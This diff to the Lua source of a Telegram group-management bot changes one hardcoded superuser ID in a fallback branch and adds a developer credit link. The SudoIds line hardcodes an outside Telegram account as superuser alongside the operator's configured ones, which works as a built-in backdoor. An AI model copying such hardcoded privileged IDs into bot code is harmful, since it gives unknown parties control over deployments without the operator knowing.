@@ -136,7 +136,7 @@ print("\27[36m"..[[
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ✘ ┉ ✘ ┉ ✘ ┉ ✘ ┉ ✘ ┉ ✘ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ✘ ┉ ✘ ┉ ✘ ┉ ✘ ┉ ✘ ┉ ✘ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId or Config.SUDO
-SudoIds = {Config.SudoIds,1666579759} or {Config.sudo_users,1666579759}
+SudoIds = {Config.SudoIds,1666579759} or {Config.sudo_users,1765028012}
 mustafa = Config.mustafa or Config.bot_id
 TokenBot = Config.TokenBot or Config.token
 NameBot = (Devmfm:get(mustafa..'mfm:NameBot') or 'الشيطان')
@@ -3558,6 +3558,7 @@ local text =  [[
 ༆ ︙[𝒔𝒐𝒖𝒓𝒄𝒆 𝒅𝒆𝒎𝒐𝒏](https://t.me/KKDKKB7)
 
 ༆︙[𝑫𝑬𝑽 :  𝑲𝑨𝑹𝑨𝑹](https://t.me/KKDKKB1)
+༆︙[𝑫𝑬𝑽 :  ⛥ᶰʳʲˡᵃˢ †⛧](https://t.me/mjnojojo)
 •● - - - - - - - - - - - - - - - - - - - - ●
 
 ]]
